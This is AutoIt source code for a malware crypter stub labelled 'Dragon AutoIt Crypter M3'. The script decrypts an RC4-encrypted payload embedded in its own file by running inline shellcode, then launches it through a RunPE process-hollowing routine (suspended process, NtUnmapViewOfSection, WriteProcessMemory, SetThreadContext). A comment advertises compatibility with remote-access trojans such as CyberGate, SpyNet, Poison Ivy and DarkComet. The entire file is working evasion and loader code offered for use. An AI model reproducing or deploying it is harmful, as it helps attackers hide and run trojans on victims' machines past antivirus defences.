#NoTrayIcon
#Region ;**** Directives created by AutoIt3Wrapper_GUI ****
#AutoIt3Wrapper_Icon=..\..\..\..\System\ICO HD\Enhancedlabs-Longhorn-Pinstripe-Network-copy.ico
#AutoIt3Wrapper_Compression=4
#AutoIt3Wrapper_UseUpx=n
#EndRegion ;**** Directives created by AutoIt3Wrapper_GUI ****

;==============================================;
; Dragon AutoIt Crypter M3					 ;
; Coded By M3								  ;
; Thanks to TRANCEXX for RunPe				 ;
; Keep Credits if you Using Source			 ;
;==============================================;

SubMain()


Func SubMain()

  $sAppPath = @ScriptFullPath
  $sKey = "\\BYM3\\"
  $AppExe = $sAppPath
  $sArquive = FileRead($sAppPath)
  $sParams = StringInstr($sArquive, $sKey)
  $sLen = $sParams + sLenEx ($sKey)
  $sArquive = StringMid($sArquive,  $sLen)
  Call (_RunPE(_RC4($sArquive, $sKey)))

	EndFunc




Func _RC4($Data, $key)


	  Local $sOpcode = "0xC81001006A006A005356578B551031C989C84989D7F2AE484829C88945F085C00F84DC000000B90001000088C82C0188840DEFFEFFFFE2F38365F4008365FC00817DFC000100007D478B45FC31D2F775F0920345100FB6008B4DFC0FB68C0DF0FEFFFF01C80345F425FF0000008945F48B75FC8A8435F0FEFFFF8B7DF486843DF0FEFFFF888435F0FEFFFFFF45FCEBB08D9DF0FEFFFF31FF89FA39550C76638B85ECFEFFFF4025FF0000008985ECFEFFFF89D80385ECFEFFFF0FB6000385E8FEFFFF25FF0000008985E8FEFFFF89DE03B5ECFEFFFF8A0689DF03BDE8FEFFFF860788060FB60E0FB60701C181E1FF0000008A840DF0FEFFFF8B750801D6300642EB985F5E5BC9C21000"
   Local $CodeBuffer = DllStructCreate("byte[" & BinaryLen($sOpcode) & "]")
   DllStructSetData($CodeBuffer, 1, $sOpcode)
   Local $Buffer = DllStructCreate("byte[" & BinaryLen($Data) & "]")
   DllStructSetData($Buffer, 1, $Data)
   DllCall("user32.dll", "none", "CallWindowProc", "ptr", DllStructGetPtr($CodeBuffer), "ptr", DllStructGetPtr($Buffer), "int", BinaryLen($Data), "str", $key, "int", 0)
   Local $Ret = DllStructGetData($Buffer, 1)
   $Buffer = 0
   $CodeBuffer = 0
   Return $Ret


	EndFunc




	Func sLenEx($sStr)

   Local $Result , $i , $bLen
   Do
   $i = $i + 1
   $bLen = StringLeft($sStr, $i)
   $Result = $i
   Until  $sStr = $bLen
   Return $Result

	EndFunc




	Func _RunPE($BBINARYIMAGE)

; RunPe
; Compatible with RATs >>  Cybergate | SpyNet | Poyson Ivy | DarkCommet
Local $BBINARY = Binary($BBINARYIMAGE)
	Local $TBINARY = DllStructCreate("byte[" & BinaryLen($BBINARY) & "]")
	DllStructSetData($TBINARY, 1, $BBINARY)
	Local $PPOINTER = DllStructGetPtr($TBINARY)
	Local $TSTARTUPINFO = DllStructCreate("dword  cbSize;" & "ptr Reserved;" & "ptr Desktop;" & "ptr Title;" & "dword X;" & "dword Y;" & "dword XSize;" & "dword YSize;" & "dword XCountChars;" & "dword YCountChars;" & "dword FillAttribute;" & "dword Flags;" & "ushort ShowWindow;" & "ushort Reserved2;" & "ptr Reserved2;" & "ptr hStdInput;" & "ptr hStdOutput;" & "ptr hStdError")
	Local $TPROCESS_INFORMATION = DllStructCreate("ptr Process;" & "ptr Thread;" & "dword ProcessId;" & "dword ThreadId")
	Local $ACALL = DllCall("Kernel32", "int", "CreateProcessW", "wstr", @AutoItExe, "ptr", 0, "ptr", 0, "ptr", 0, "int", 0, "dword", 4, "ptr", 0, "ptr", 0, "ptr", DllStructGetPtr($TSTARTUPINFO), "ptr", DllStructGetPtr($TPROCESS_INFORMATION))
	Local $HPROCESS = DllStructGetData($TPROCESS_INFORMATION, "Process")
	Local $HTHREAD = DllStructGetData($TPROCESS_INFORMATION, "Thread")
	Local $TCONTEXT = DllStructCreate("dword ContextFlags;" & "dword Dr0;" & "dword Dr1;" & "dword Dr2;" & "dword Dr3;" & "dword Dr6;" & "dword Dr7;" & "dword ControlWord;" & "dword StatusWord;" & "dword TagWord;" & "dword ErrorOffset;" & "dword ErrorSelector;" & "dword DataOffset;" & "dword DataSelector;" & "byte RegisterArea[80];" & "dword Cr0NpxState;" & "dword SegGs;" & "dword SegFs;" & "dword SegEs;" & "dword SegDs;" & "dword Edi;" & "dword Esi;" & "dword Ebx;" & "dword Edx;" & "dword Ecx;" & "dword Eax;" & "dword Ebp;" & "dword Eip;" & "dword SegCs;" & "dword EFlags;" & "dword Esp;" & "dword SegS")
	DllStructSetData($TCONTEXT, "ContextFlags", 65538)
	$ACALL = DllCall("Kernel32", "int", "GetThreadContext", "ptr", $HTHREAD, "ptr", DllStructGetPtr($TCONTEXT))
	Local $TIMAGE_DOS_HEADER = DllStructCreate("char Magic[2];" & "ushort BytesOnLastPage;" & "ushort Pages;" & "ushort Relocations;" & "ushort SizeofHeader;" & "ushort MinimumExtra;" & "ushort MaximumExtra;" & "ushort SS;" & "ushort SP;" & "ushort Checksum;" & "ushort IP;" & "ushort CS;" & "ushort Relocation;" & "ushort Overlay;" & "char Reserved[8];" & "ushort OEMIdentifier;" & "ushort OEMInformation;" & "char Reserved2[20];" & "dword AddressOfNewExeHeader", $PPOINTER)
	$PPOINTER += DllStructGetData($TIMAGE_DOS_HEADER, "AddressOfNewExeHeader")
	Local $SMAGIC = DllStructGetData($TIMAGE_DOS_HEADER, "Magic")
	If Not ($SMAGIC == "MZ") Then
	DllCall("Kernel32", "int", "TerminateProcess", "ptr", $HPROCESS, "dword", 0)
	Return SetError(3, 0, 0)
	EndIf
	Local $TIMAGE_NT_SIGNATURE = DllStructCreate("dword Signature", $PPOINTER)
	$PPOINTER += 4
	If DllStructGetData($TIMAGE_NT_SIGNATURE, "Signature") <> 17744 Then
	DllCall("Kernel32", "int", "TerminateProcess", "ptr", $HPROCESS, "dword", 0)
	Return SetError(4, 0, 0)
	EndIf
	Local $TIMAGE_FILE_HEADER = DllStructCreate("ushort Machine;" & "ushort NumberOfSections;" & "dword TimeDateStamp;" & "dword PointerToSymbolTable;" & "dword NumberOfSymbols;" & "ushort SizeOfOptionalHeader;" & "ushort Characteristics", $PPOINTER)
	Local $INUMBEROFSECTIONS = DllStructGetData($TIMAGE_FILE_HEADER, "NumberOfSections")
	$PPOINTER += 20
	Local $TIMAGE_OPTIONAL_HEADER = DllStructCreate("ushort Magic;" & "ubyte MajorLinkerVersion;" & "ubyte MinorLinkerVersion;" & "dword SizeOfCode;" & "dword SizeOfInitializedData;" & "dword SizeOfUninitializedData;" & "dword AddressOfEntryPoint;" & "dword BaseOfCode;" & "dword BaseOfData;" & "dword ImageBase;" & "dword SectionAlignment;" & "dword FileAlignment;" & "ushort MajorOperatingSystemVersion;" & "ushort MinorOperatingSystemVersion;" & "ushort MajorImageVersion;" & "ushort MinorImageVersion;" & "ushort MajorSubsystemVersion;" & "ushort MinorSubsystemVersion;" & "dword Win32VersionValue;" & "dword SizeOfImage;" & "dword SizeOfHeaders;" & "dword CheckSum;" & "ushort Subsystem;" & "ushort DllCharacteristics;" & "dword SizeOfStackReserve;" & "dword SizeOfStackCommit;" & "dword SizeOfHeapReserve;" & "dword SizeOfHeapCommit;" & "dword LoaderFlags;" & "dword NumberOfRvaAndSizes", $PPOINTER)
	$PPOINTER += 96
	Local $IMAGIC = DllStructGetData($TIMAGE_OPTIONAL_HEADER, "Magic")
	If $IMAGIC <> 267 Then
	DllCall("Kernel32", "int", "TerminateProcess", "ptr", $HPROCESS, "dword", 0)
	Return SetError(5, 0, 0)
	EndIf
	Local $IENTRYPOINTNEW = DllStructGetData($TIMAGE_OPTIONAL_HEADER, "AddressOfEntryPoint")
	$PPOINTER += 128
	Local $POPTIONALHEADERIMAGEBASENEW = DllStructGetData($TIMAGE_OPTIONAL_HEADER, "ImageBase")
	Local $IOPTIONALHEADERSIZEOFIMAGENEW = DllStructGetData($TIMAGE_OPTIONAL_HEADER, "SizeOfImage")
	$ACALL = DllCall("Ntdll", "int", "NtUnmapViewOfSection", "ptr", $HPROCESS, "ptr", $POPTIONALHEADERIMAGEBASENEW)
	$ACALL = DllCall("Kernel32", "ptr", "VirtualAllocEx", "ptr", $HPROCESS, "ptr", $POPTIONALHEADERIMAGEBASENEW, "dword", $IOPTIONALHEADERSIZEOFIMAGENEW, "dword", 12288, "dword", 64)
	Local $PREMOTECODE = $ACALL[0]
	Local $PHEADERS_NEW = DllStructGetPtr($TIMAGE_DOS_HEADER)
	Local $IOPTIONALHEADERSIZEOFHEADERSNEW = DllStructGetData($TIMAGE_OPTIONAL_HEADER, "SizeOfHeaders")
	$ACALL = DllCall("Kernel32", "int", "WriteProcessMemory", "ptr", $HPROCESS, "ptr", $PREMOTECODE, "ptr", $PHEADERS_NEW, "dword", $IOPTIONALHEADERSIZEOFHEADERSNEW, "dword*", 0)
	Local $TIMAGE_SECTION_HEADER
	Local $ISIZEOFRAWDATA, $PPOINTERTORAWDATA
	Local $IVIRTUALADDRESS
	For $I = 1 To $INUMBEROFSECTIONS
	$TIMAGE_SECTION_HEADER = DllStructCreate("char Name[8];" & "dword UnionOfVirtualSizeAndPhysicalAddress;" & "dword VirtualAddress;" & "dword SizeOfRawData;" & "dword PointerToRawData;" & "dword PointerToRelocations;" & "dword PointerToLinenumbers;" & "ushort NumberOfRelocations;" & "ushort NumberOfLinenumbers;" & "dword Characteristics", $PPOINTER)
	$ISIZEOFRAWDATA = DllStructGetData($TIMAGE_SECTION_HEADER, "SizeOfRawData")
	$PPOINTERTORAWDATA = DllStructGetPtr($TIMAGE_DOS_HEADER) + DllStructGetData($TIMAGE_SECTION_HEADER, "PointerToRawData")
	$IVIRTUALADDRESS = DllStructGetData($TIMAGE_SECTION_HEADER, "VirtualAddress")
	If $ISIZEOFRAWDATA Then
	$ACALL = DllCall("Kernel32", "int", "WriteProcessMemory", "ptr", $HPROCESS, "ptr", $PREMOTECODE + $IVIRTUALADDRESS, "ptr", $PPOINTERTORAWDATA, "dword", $ISIZEOFRAWDATA, "dword*", 0)
	EndIf
	$PPOINTER += 40
	Next
	DllStructSetData($TCONTEXT, "Eax", $PREMOTECODE + $IENTRYPOINTNEW)
	$ACALL = DllCall("Kernel32", "int", "SetThreadContext", "ptr", $HTHREAD, "ptr", DllStructGetPtr($TCONTEXT))
	$ACALL = DllCall("Kernel32", "int", "ResumeThread", "ptr", $HTHREAD)
	EndFunc